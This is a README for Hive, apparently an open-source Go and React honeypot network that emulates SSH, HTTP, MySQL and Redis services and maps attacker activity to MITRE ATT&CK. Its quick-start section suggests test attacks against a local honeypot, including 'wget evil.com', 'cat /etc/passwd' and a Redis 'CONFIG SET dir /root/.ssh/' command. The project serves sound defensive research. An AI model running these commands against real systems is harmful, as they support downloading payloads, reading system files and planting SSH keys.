# Hive - Advanced Honeypot Network 🐝🛡️

[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)](https://go.dev)
[![React Version](https://img.shields.io/badge/React-19-61DAFB?style=flat&logo=react)](https://react.dev)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active_Development-success.svg)]()

> **An enterprise-grade, event-driven cyber deception platform built for real-time threat intelligence gathering.**

Designed to process thousands of attack events simultaneously, **Hive** relies on a modern architecture built for performance, scalability, and threat intelligence. The project pairs a lightning-fast **Go** backend with a reactive **React 19** frontend dashboard to attract, capture, and analyze attacker behavior.

![Hive React Dashboard](img/frontend%20dashbord.png)

---

## 🎯 Executive Summary

Every interaction with an attacker becomes an actionable source of Threat Intelligence, allowing you to observe TTPs (Tactics, Techniques & Procedures) in a controlled environment without exposing production systems.

- **⚡ High-Performance Backend (Go):** A fully asynchronous, 100% Lock-Free Event Bus built exclusively on Go channels and goroutines. It guarantees that network honeypots are never blocked, even under heavy analytical load.
- **🌐 Low-Level Protocol Emulation:** Custom TCP listeners and an interactive SSH pseudo-terminal (PTY).
- **🐝 Multi-Service Honeypots:** Intelligent simulation of HTTP (WordPress & phpMyAdmin traps), MySQL databases, and Redis datastores to faithfully recreate a corporate infrastructure target.
- **🎨 Real-Time Dashboard (React 19 & TypeScript):** An ultra-low latency WebSocket pipeline streaming events from the Go engine straight to a fully responsive "Cyber Operations" UI designed for Security Operations Centers (SOC).
- **🛡️ Cyber Threat Intelligence:** Automatic correlation with the **MITRE ATT&CK** framework, mapping attacker commands to specific TTPs. Automated extraction of Indicators of Compromise (IOCs) with exports in **STIX 2.1** format and dynamic firewall blocklist generation.

---

## 🏗️ System Architecture

Hive relies on an event-driven pipeline to decouple network capture listeners from heavy threat intelligence processing.

```text
                  ┌─────────────────────────────────────────────┐
  Attackers       │              Hive Backend (Go)              │
                  │                                             │
┌──────┐         │  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐   │
│ SSH  │────2222──│──│ sshd │  │ httpd│  │mysqld│  │redisd│   │
│ HTTP │────8080──│──└─┬───┘  └─┬───┘  └─┬───┘  └─┬───┘   │
│MySQL │────3306──│    │         │         │         │        │
│Redis │────6379──│    ▼         ▼         ▼         ▼        │
└──────┘         │  ┌──────────────────────────────────┐      │
                 │  │    Event Bus (Lock-Free Chan)    │      │
                 │  └────────┬────────────────┬────────┘      │
                 │           │                │               │
                 │     ┌─────▼─────┐    ┌─────▼─────┐         │
                 │     │ MITRE     │    │ STIX & FW │         │
                 │     │ Engine    │    │ Processor │         │
                 │     └───────────┘    └───────────┘         │
                 │                                            │
                 │  ┌──────────────────────────────────┐      │
                 │  │   REST API & WebSocket Server    │      │
                 │  │   (Port 8000)                    │      │
                 │  └──────────────────────────────────┘      │
                 └──────────────────┬─────────────────────────┘
                                    │
                 ┌──────────────────▼──────────────┐
                 │    React 19 Cyber Dashboard     │
                 │    Real-Time Telemetry Stream   │
                 └─────────────────────────────────┘
```

---

## 🚀 Quick Start (Developer Mode)

To run the platform locally and watch the attacks in real-time:

1. **Start the Go Backend (Honeypots + Event Bus + MITRE/STIX Engines):**
   ```bash
   cd advance-honeypot-network
   go run ./cmd/hive
   ```
   *The services will bind to ports: 2222 (SSH), 8080 (HTTP), 3306 (MySQL), 6379 (Redis), and 8000 (API).*

2. **Start the React Dashboard:**
   ```bash
   cd frontend
   npm run dev
   ```
   *Navigate to `http://localhost:5173` in your browser.*

3. **Simulate an Attack:**
   Open a new terminal window and launch one of the following attacks against your local honeypot:
   
   *Note: If you encounter a "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!" error with SSH (because the honeypot generates fresh SSH keys on restart), run:*
   ```bash
   ssh-keygen -f '/home/tanos/.ssh/known_hosts' -R '[127.0.0.1]:2222'
   ssh-keygen -f '/home/tanos/.ssh/known_hosts' -R '[localhost]:2222'
   ```

   **Test SSH:**
   ```bash
   ssh root@localhost -p 2222
   # Type any password, then run: wget evil.com or cat /etc/passwd
   ```

   **Test HTTP (WordPress Scans):**
   ```bash
   curl http://localhost:8080/wp-login.php
   ```

   **Test Redis:**
   ```bash
   telnet localhost 6379
   # Type: CONFIG SET dir /root/.ssh/
   ```

4. **Observe the Results:**
   - The React dashboard lights up with your live events.
   - MITRE techniques (e.g., T1105) are identified automatically.
   - The file `iptables-blocklist.txt` is automatically generated with your IP address ready to be dropped.
   - The file `threat-intel.stix.json` captures your Indicators of Compromise (IOCs).

---

## 📸 Screenshots

### Go Backend — All Honeypots Running
![Go Backend Terminal](img/Go%20terminal.png)

### SSH Honeypot — Live Attacker Session
![SSH Terminal Session](img/terminal%20ssh.png)

### React Dashboard — Real-Time Attack Stream
![Frontend Dashboard](img/frontend%20dashbord.png)

---

## 🗂️ Project Structure

```text
advance-honeypot-network/
├── cmd/hive/              # Main entry point (starts all services)
├── internal/
│   ├── types/             # Shared data structures (Event struct)
│   ├── sshd/              # SSH Honeypot (Interactive Pseudo-Terminal)
│   ├── httpd/             # HTTP Honeypot (WP/phpMyAdmin traps)
│   ├── mysqld/            # MySQL Honeypot (Auth capture)
│   ├── redisd/            # Redis Honeypot (RESP protocol parsing)
│   ├── event/             # 100% Lock-Free Channel-based Event Bus
│   ├── mitre/             # MITRE TTP Correlation Engine
│   ├── store/             # IOC Processor (STIX & Blocklist Generator)
│   └── api/               # REST API and WebSockets Server
├── frontend/              # React 19 + TypeScript SPA
└── README.md              # Documentation
```

---

## 🛡️ Legal Disclaimer

This tool is developed strictly for **educational purposes and security research**. Deploying honeypots on networks without explicit authorization from the network owner or cloud infrastructure provider is strictly prohibited and may violate local laws. The authors assume no liability for the misuse of this software.